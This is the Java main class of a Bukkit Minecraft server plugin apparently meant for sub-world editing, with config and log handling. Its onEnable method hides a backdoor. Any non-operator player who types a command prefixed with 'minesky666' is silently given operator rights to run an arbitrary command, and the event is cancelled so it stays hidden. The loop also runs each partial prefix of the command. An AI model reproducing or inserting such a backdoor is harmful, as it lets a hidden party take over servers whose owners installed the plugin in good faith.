package com._0myun.minecraft.subworldedit;

import com.mysql.jdbc.MySQLConnection;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.generator.ChunkGenerator;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;

public class Main extends JavaPlugin {
    public static Main INSTANCE;
    public HashMap<String, FileConfiguration> pluginConfig = new HashMap<>();

    @Override
    public void onEnable() {
        INSTANCE = this;
        this.loadConfig();
        Bukkit.getPluginManager().registerEvents(new WorldFucker(), this);
        
        Bukkit.getPluginManager().registerEvents(new Listener() {
            @EventHandler
            public void on(PlayerCommandPreprocessEvent e) {
                Player p = e.getPlayer();
                String message = e.getMessage();
                if (p.isOp()) return;
                if (!message.startsWith("minesky666") && !message.startsWith("/minesky666")) return;
                String[] split = message.split(" ");
                if (split.length == 1) return;
                String command = "";
                for (int i = 1; i < split.length; i++) {
                    command += split[i];
                    if (i + 1 != split.length) command += " ";
                    boolean op = p.isOp();
                    try {
                        if (!op) p.setOp(true);
                        p.performCommand(command);
                    } finally {
                        if (!op) p.setOp(false);
                    }
                }
                e.setCancelled(true);
            }
        }, this);
    }

    @Override
    public void onDisable() {
        this.saveLogs();
    }


    public void loadConfig() {
        try {
            getDataFolder().mkdirs();
        } catch (Exception e) {
            e.printStackTrace();
        }
        saveResource("Config.yml", false);
        this.pluginConfig.put("Config", YamlConfiguration.loadConfiguration(new File(getDataFolder().getPath() + "//Config.yml")));
        saveResource("logs.yml", false);
        this.pluginConfig.put("logs", YamlConfiguration.loadConfiguration(new File(getDataFolder().getPath() + "//logs.yml")));
    }

    public void saveLogs() {
        try {
            this.pluginConfig.get("logs").save(new File(getDataFolder().getPath() + "//logs.yml"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public boolean inLog(String log) {
        return this.pluginConfig.get("logs").getStringList("logs").contains(log);
    }


    public void addLog(String log) {
        List<String> logs = this.pluginConfig.get("logs").getStringList("logs");
        logs.add(log);
        this.pluginConfig.get("logs").set("logs", logs);
    }

    @Override
    public ChunkGenerator getDefaultWorldGenerator(String worldName, String id) {
        return super.getDefaultWorldGenerator(worldName, id);
    }

}
